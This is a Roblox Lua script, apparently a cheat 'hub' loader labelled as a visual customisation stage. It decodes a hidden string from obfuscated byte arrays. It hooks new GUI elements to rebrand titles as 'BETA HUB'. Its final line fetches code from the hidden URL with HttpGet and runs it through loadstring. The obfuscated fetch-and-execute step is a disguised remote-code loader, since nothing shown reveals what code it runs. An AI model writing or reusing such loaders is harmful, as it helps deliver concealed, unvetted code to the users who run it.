
--[[ STAGE 2: VISUAL CORE ]]
local R65Ci_o0ALmJ_XxAwt1N = bit32 and bit32.bxor
if not R65Ci_o0ALmJ_XxAwt1N then
    R65Ci_o0ALmJ_XxAwt1N = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function M_Y09OrNrT4al1r4fZl0wR4j(data, a, b, m, s, r)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local step = (b + i * s) % 256
        if m == 0 then
            v = (v - step) % 256
            v = R65Ci_o0ALmJ_XxAwt1N(v, a)
        else
            v = R65Ci_o0ALmJ_XxAwt1N(v, a)
            v = (v - step) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local srBWEtnY3H9eWl6AuXMCA = {
  {{215, 231, 249}, 72, 56, 1, 4, false, 7},
  {{21, 22, 197, 23, 4}, 107, 181, 0, 2, false, 22},
  {{158, 164, 218, 199, 215, 229}, 60, 72, 0, 7, true, 14},
  {{54, 57, 5, 48, 55}, 222, 108, 1, 4, false, 11},
  {{111, 75, 126, 23, 106, 101, 104}, 215, 68, 1, 2, true, 17},
  {{172, 124, 127}, 152, 191, 0, 3, true, 2},
  {{85, 71, 95}, 129, 90, 1, 5, false, 4},
  {{171, 176, 176, 13, 204}, 112, 170, 0, 1, false, 12},
  {{217, 203, 228, 228, 179, 224, 244}, 19, 88, 0, 6, true, 3},
  {{116, 115, 107, 122, 95}, 176, 147, 0, 2, true, 10},
  {{231, 40, 33, 247, 252, 0}, 238, 97, 0, 5, true, 18},
  {{148, 154, 153, 156, 157, 224}, 200, 237, 0, 2, true, 8},
  {{171, 184, 165, 137, 133, 141, 223}, 105, 86, 1, 7, false, 9},
  {{203, 195, 219, 208}, 17, 82, 0, 7, true, 5},
  {{99, 116, 114}, 199, 184, 0, 5, true, 23},
  {{141, 188, 167, 166, 174, 154}, 211, 241, 1, 5, false, 1},
  {{225, 138, 178}, 209, 248, 1, 2, true, 20},
  {{155, 167, 161, 179, 133, 124}, 19, 32, 0, 5, false, 15},
  {{214, 171, 164, 170, 176, 177, 73}, 76, 101, 1, 7, true, 6},
  {{136, 147, 150}, 195, 17, 1, 6, true, 21},
  {{99, 113, 124, 67}, 144, 108, 0, 6, false, 13},
  {{177, 167, 169}, 159, 176, 0, 5, true, 19},
  {{98, 74, 56}, 224, 157, 0, 6, false, 16}
}
local mCegp9nP7tsSWlztRCK0 = {}
for bEWLI6TQDmHAoowyf = 1, #srBWEtnY3H9eWl6AuXMCA do
    local SCe0dKB0QkF0UR2hsbtzH8IIV = srBWEtnY3H9eWl6AuXMCA[bEWLI6TQDmHAoowyf]
    mCegp9nP7tsSWlztRCK0[SCe0dKB0QkF0UR2hsbtzH8IIV[7]] = M_Y09OrNrT4al1r4fZl0wR4j(SCe0dKB0QkF0UR2hsbtzH8IIV[1], SCe0dKB0QkF0UR2hsbtzH8IIV[2], SCe0dKB0QkF0UR2hsbtzH8IIV[3], SCe0dKB0QkF0UR2hsbtzH8IIV[4], SCe0dKB0QkF0UR2hsbtzH8IIV[5], SCe0dKB0QkF0UR2hsbtzH8IIV[6])
end
local S9suMI_rEf76BXxuCKRsc = table.concat(mCegp9nP7tsSWlztRCK0)
local HubName = "BETA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(S9suMI_rEf76BXxuCKRsc))()
